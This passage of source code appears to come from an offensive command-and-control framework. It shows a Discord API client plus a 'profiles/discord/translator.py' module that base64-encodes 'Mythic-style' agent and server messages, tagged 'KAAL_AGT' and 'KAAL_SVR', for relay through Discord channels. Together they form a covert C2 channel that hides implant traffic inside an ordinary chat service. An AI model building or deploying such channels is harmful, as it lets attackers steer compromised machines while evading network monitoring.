        data = await self._request("GET", f"/channels/{channel_id}/messages", params=params)
        if data and isinstance(data, list):
            # Discord returns newest first, so reverse to oldest first
            for msg in reversed(data):
                yield msg
                
    async def send_message(self, channel_id: str, content: str) -> Optional[Dict[str, Any]]:
        """Send a message to a channel."""
        payload = {"content": content}
        return await self._request("POST", f"/channels/{channel_id}/messages", json=payload)
    
    async def delete_message(self, channel_id: str, message_id: str) -> bool:
        """Delete a message."""
        result = await self._request("DELETE", f"/channels/{channel_id}/messages/{message_id}")
        return result is not None

```

### File: `profiles/discord/translator.py`
```python
import base64
import json
import logging

logger = logging.getLogger("translator")

class MessageTranslator:
    """Mythic-style encoding: base64(agent_id + ':' + json)"""
    
    @staticmethod
    def encode(agent_id: str, data: dict) -> str:
        """Encode data for agent."""
        combined = f"{agent_id}:{json.dumps(data)}"
        return base64.b64encode(combined.encode()).decode()
    
    @staticmethod
    def decode(encoded: str) -> tuple[str, dict]:
        """Decode agent message, returns (agent_id, data)."""
        try:
            decoded = base64.b64decode(encoded).decode()
            if ":" not in decoded:
                raise ValueError("Missing colon")
            agent_id, json_str = decoded.split(":", 1)
            data = json.loads(json_str)
            return agent_id, data
        except Exception as e:
            logger.error(f"Decode error: {e}")
            raise
    
    def discord_to_server(self, content: str) -> tuple[str, dict]:
        """Convert Discord message (KAAL_AGT:...) to server dict."""
        if not content.startswith("KAAL_AGT:"):
            raise ValueError("Not a KAAL agent message")
        encoded = content[9:]  # strip prefix
        agent_id, data = self.decode(encoded)
        return agent_id, data
    
    def server_to_discord(self, agent_id: str, command: dict) -> str:
        """Convert server command to Discord message (KAAL_SVR:...)."""
        encoded = self.encode(agent_id, command)
        return f"KAAL_SVR:{encoded}"

```
